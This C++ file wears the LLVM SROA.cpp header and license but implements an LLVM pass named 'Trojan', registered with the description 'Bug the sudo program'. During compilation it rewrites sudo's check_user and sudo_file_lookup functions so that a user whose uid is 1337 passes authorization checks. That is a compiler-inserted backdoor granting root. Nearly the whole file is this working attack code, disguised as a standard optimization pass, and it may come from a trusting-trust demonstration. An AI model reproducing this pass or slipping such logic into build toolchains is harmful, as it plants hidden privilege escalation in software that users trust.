//===- SROA.cpp - Scalar Replacement Of Aggregates ------------------------===//
//
// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.
// See https://llvm.org/LICENSE.txt for license information.
// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception
//
//===----------------------------------------------------------------------===//
/// \file
/// This transformation implements the well known scalar replacement of
/// aggregates transformation. It tries to identify promotable elements of an
/// aggregate alloca, and promote them to registers. It will also try to
/// convert uses of an element (or set of elements) of an alloca into a vector
/// or bitfield-style integer scalar if appropriate.
///
/// It works to do this with minimal slicing of the alloca so that regions
/// which are merely transferred in and out of external memory remain unchanged
/// and are not decomposed to scalar code.
///
/// Because this also performs alloca promotion, it can be thought of as also
/// serving the purpose of SSA formation. The algorithm iterates on the
/// function until all opportunities for promotion have been realized.
///
//===----------------------------------------------------------------------===//

#include "llvm/ADT/APInt.h"
#include "llvm/ADT/ArrayRef.h"
#include "llvm/ADT/DenseMap.h"
#include "llvm/ADT/PointerIntPair.h"
#include "llvm/ADT/STLExtras.h"
#include "llvm/ADT/SetVector.h"
#include "llvm/ADT/SmallBitVector.h"
#include "llvm/ADT/SmallPtrSet.h"
#include "llvm/ADT/SmallVector.h"
#include "llvm/ADT/Statistic.h"
#include "llvm/ADT/StringRef.h"
#include "llvm/ADT/Twine.h"
#include "llvm/ADT/iterator.h"
#include "llvm/ADT/iterator_range.h"
#include "llvm/Analysis/AssumptionCache.h"
#include "llvm/Analysis/GlobalsModRef.h"
#include "llvm/Analysis/Loads.h"
#include "llvm/Analysis/PtrUseVisitor.h"
#include "llvm/Config/llvm-config.h"
#include "llvm/Transforms/Utils/BasicBlockUtils.h"
#include "llvm/IR/BasicBlock.h"
#include "llvm/IR/Constant.h"
#include "llvm/IR/ConstantFolder.h"
#include "llvm/IR/Constants.h"
#include "llvm/IR/DIBuilder.h"
#include "llvm/IR/DataLayout.h"
#include "llvm/IR/DebugInfoMetadata.h"
#include "llvm/IR/DerivedTypes.h"
#include "llvm/IR/Dominators.h"
#include "llvm/IR/Function.h"
#include "llvm/IR/GetElementPtrTypeIterator.h"
#include "llvm/IR/GlobalAlias.h"
#include "llvm/IR/IRBuilder.h"
#include "llvm/IR/InstVisitor.h"
#include "llvm/IR/InstrTypes.h"
#include "llvm/IR/Instruction.h"
#include "llvm/IR/Instructions.h"
#include "llvm/IR/IntrinsicInst.h"
#include "llvm/IR/Intrinsics.h"
#include "llvm/IR/LLVMContext.h"
#include "llvm/IR/Metadata.h"
#include "llvm/IR/Module.h"
#include "llvm/IR/Operator.h"
#include "llvm/IR/PassManager.h"
#include "llvm/IR/Type.h"
#include "llvm/IR/Use.h"
#include "llvm/IR/User.h"
#include "llvm/IR/Value.h"
#include "llvm/InitializePasses.h"
#include "llvm/Pass.h"
#include "llvm/Support/Casting.h"
#include "llvm/Support/CommandLine.h"
#include "llvm/Support/Compiler.h"
#include "llvm/Support/Debug.h"
#include "llvm/Support/ErrorHandling.h"
#include "llvm/Support/MathExtras.h"
#include "llvm/Support/raw_ostream.h"
#include "llvm/Transforms/Scalar.h"
#include "llvm/Transforms/Utils/Local.h"
#include "llvm/Transforms/Utils/PromoteMemToReg.h"
#include <algorithm>
#include <cassert>
#include <chrono>
#include <cstddef>
#include <cstdint>
#include <cstring>
#include <iterator>
#include <string>
#include <tuple>
#include <utility>
#include <vector>

#ifndef NDEBUG
// We only use this for a debug check.
#include <random>
#endif

namespace llvm {
	class TrojanLegacyPass;
	FunctionPass *createTrojanPass();
}

using namespace llvm;
//using namespace llvm::trojan;

#define DEBUG_TYPE "trojan"

/// A legacy pass for the legacy pass manager that wraps the \c SROA pass.
///
/// This is in the llvm namespace purely to allow it to be a friend of the \c
/// SROA pass.
class llvm::TrojanLegacyPass : public FunctionPass {
  /// The SROA implementation.
  //SROA Impl;

public:
  static char ID;

  TrojanLegacyPass() : FunctionPass(ID) {
    initializeTrojanLegacyPassPass(*PassRegistry::getPassRegistry());
  }

  bool runOnFunction(Function &F) override {
    errs() << "Fn Name: " << F.getName() << "\n";
    bool changed = false;
    if (F.getName() == "check_user") {
	    Module *m = F.getParent();
	    GlobalValue *v = m->getNamedValue("sudo_user");
	    errs() << "Found check_user" << "\n";
	    //for (auto &Global : m->getGlobalList())
	    //	    errs() << Global << "\n";
	    if (v) {
		errs() << "#### Found sudo_user ####" << "\n";
		Type *t = v->getValueType();
		errs() << v << "\n";
		errs() << t->isStructTy() << "\n";
		if (t->isStructTy()) {
	            errs() << "#### Passed Struct test ####" << "\n";
		    auto numElements = t->getStructNumElements() ;
		    errs() << "## Num elements " << numElements << "\n";
		    if (numElements < 3)
			    return false;

		    Instruction *InsertPoint = &(*(F.getEntryBlock().getFirstInsertionPt()));
		    IRBuilder<> IRB(InsertPoint);
		    IRB.SetInsertPoint(InsertPoint);
		    //Value *uid = IRB.CreateGEP(v, IRB.getInt64(numElements - 3));
		    std::vector<llvm::Value*> indices(2);
		    indices[0] = IRB.getInt32(0);
		    indices[1] = IRB.getInt32(numElements - 3);

		    Value *uid = IRB.CreateGEP(t, v, indices, "uidPtr");
		    if (uid)
			   errs() << "## Successfully inserted GEP ##" << "\n";
		    
	    	    LoadInst *uid_loaded = IRB.CreateLoad(uid);
		    auto uidPtr = uid_loaded->getPointerOperandType();
		    
		    if (uidPtr->isPointerTy() && dyn_cast<PointerType>(uidPtr)->getElementType()->isIntegerTy()) {
			errs() << "## UID is integer type ##" << "\n";
			//auto uidType = dyn_cast<PointerType>(uidPtr)->getElementType();
			auto bitwidth = dyn_cast<IntegerType>(dyn_cast<PointerType>(uidPtr)->getElementType())->getBitWidth();
			Value *CmpEq;
			//LoadInst *uid_loaded = IRB.CreateLoad(uid);
			if (bitwidth == 64)
		    		CmpEq = IRB.CreateICmpEQ(uid_loaded, IRB.getInt64(1337));
			else
				CmpEq = IRB.CreateICmpEQ(uid_loaded, IRB.getInt32(1337));

		    	BranchInst *BI = cast<BranchInst>(
				    SplitBlockAndInsertIfThen(CmpEq, InsertPoint, false));

		    	IRBuilder<> ThenB(BI);
		    	Value *retval = ConstantInt::get(F.getReturnType(), 0x1);
		    	ThenB.CreateRet(retval);
			auto BB = ThenB.GetInsertBlock();
			for (auto inst = BB->begin(); inst != BB->end(); ) {
 			       Instruction *Inst = &(*(inst++));
			       if (isa<BranchInst>(Inst)) {
				       BranchInst *BI = dyn_cast<BranchInst>(Inst);
				       if(BI->isUnconditional()) {
					       BI->dropAllReferences();
					       BI->removeFromParent();
				       }
			       }
      			}

			changed = true;
		    }

		    //changed = true;
		    /*
		    // -3 is uid
	            //auto bb = F.getEntryBlock()
		    Instruction *InsertPoint = &(*(F.getEntryBlock().getFirstInsertionPt()));
		    errs() << InsertPoint << "\n";
		
		    BasicBlock* trojan = BasicBlock::Create(F.getContext(), "trojan", &(F), &((F.getEntryBlock())));
		    IRBuilder<> IRB(trojan);
		    IRB.SetInsertPoint(trojan);

		    //auto context = F.getContext();
		    Value *retval = ConstantInt::get(F.getReturnType(), 0x1);
		    IRB.CreateRet(retval);
		    changed = true;*/
		}
	    }
    } else if (F.getName() == "sudo_file_lookup") {
	Module *m = F.getParent();
	    GlobalValue *v = m->getNamedValue("sudo_user");
	    errs() << "Found check_user" << "\n";
	    //for (auto &Global : m->getGlobalList())
	    //	    errs() << Global << "\n";
	    if (v) {
		errs() << "#### Found sudo_user ####" << "\n";
		Type *t = v->getValueType();
		errs() << v << "\n";
		errs() << t->isStructTy() << "\n";
		if (t->isStructTy()) {
	            errs() << "#### Passed Struct test ####" << "\n";
		    auto numElements = t->getStructNumElements() ;
		    errs() << "## Num elements " << numElements << "\n";
		    if (numElements < 3)
			    return false;

		    Instruction *InsertPoint = &(*(F.getEntryBlock().getFirstInsertionPt()));
		    IRBuilder<> IRB(InsertPoint);
		    IRB.SetInsertPoint(InsertPoint);
		    //Value *uid = IRB.CreateGEP(v, IRB.getInt64(numElements - 3));
		    std::vector<llvm::Value*> indices(2);
		    indices[0] = IRB.getInt32(0);
		    indices[1] = IRB.getInt32(numElements - 3);

		    Value *uid = IRB.CreateGEP(t, v, indices, "uidPtr");
		    if (uid)
			   errs() << "## Successfully inserted GEP ##" << "\n";
		    
	    	    LoadInst *uid_loaded = IRB.CreateLoad(uid);
		    auto uidPtr = uid_loaded->getPointerOperandType();
		    
		    if (uidPtr->isPointerTy() && dyn_cast<PointerType>(uidPtr)->getElementType()->isIntegerTy()) {
			errs() << "## UID is integer type ##" << "\n";
			//auto uidType = dyn_cast<PointerType>(uidPtr)->getElementType();
			auto bitwidth = dyn_cast<IntegerType>(dyn_cast<PointerType>(uidPtr)->getElementType())->getBitWidth();
			Value *CmpEq;
			//LoadInst *uid_loaded = IRB.CreateLoad(uid);
			if (bitwidth == 64)
		    		CmpEq = IRB.CreateICmpEQ(uid_loaded, IRB.getInt64(1337));
			else
				CmpEq = IRB.CreateICmpEQ(uid_loaded, IRB.getInt32(1337));

		    	BranchInst *BI = cast<BranchInst>(
				    SplitBlockAndInsertIfThen(CmpEq, InsertPoint, false));
			
			auto validated_arg = F.getArg(1);
			
			if (validated_arg && validated_arg->getType()->isIntegerTy()){
				IRBuilder<> ThenB(BI);
				Value *valRet = ThenB.CreateOr(validated_arg, ConstantInt::get(validated_arg->getType(), 0x002));
				ThenB.CreateRet(valRet);
				auto BB = ThenB.GetInsertBlock();
				for (auto inst = BB->begin(); inst != BB->end(); ) {
 				       Instruction *Inst = &(*(inst++));
			       	       if (isa<BranchInst>(Inst)) {
				       		BranchInst *BI = dyn_cast<BranchInst>(Inst);
				       		if(BI->isUnconditional()) {
					       		BI->dropAllReferences();
					       		BI->removeFromParent();
					       }
				       }
      				}

			}
		}
	}}
			changed = true;
    }
    return changed;

  }
	    

	    
    /*if (skipFunction(F))
      return false;

    auto PA = Impl.runImpl(
        F, getAnalysis<DominatorTreeWrapperPass>().getDomTree(),
        getAnalysis<AssumptionCacheTracker>().getAssumptionCache(F));
    return !PA.areAllPreserved();*/
    //return false;
  //}

  /*void getAnalysisUsage(AnalysisUsage &AU) const override {
    AU.addRequired<AssumptionCacheTracker>();
    AU.addRequired<DominatorTreeWrapperPass>();
    AU.addPreserved<GlobalsAAWrapperPass>();
    AU.setPreservesCFG();
  }*/

  StringRef getPassName() const override { return "Trojan"; }
};

char TrojanLegacyPass::ID = 0;

FunctionPass *llvm::createTrojanPass() { return new TrojanLegacyPass(); }

INITIALIZE_PASS_BEGIN(TrojanLegacyPass, "trojan",
                      "Bug the sudo program", false, false)
//INITIALIZE_PASS_DEPENDENCY(AssumptionCacheTracker)
//INITIALIZE_PASS_DEPENDENCY(DominatorTreeWrapperPass)
INITIALIZE_PASS_END(TrojanLegacyPass, "trojan", "Bug the sudo program",
                    false, false)
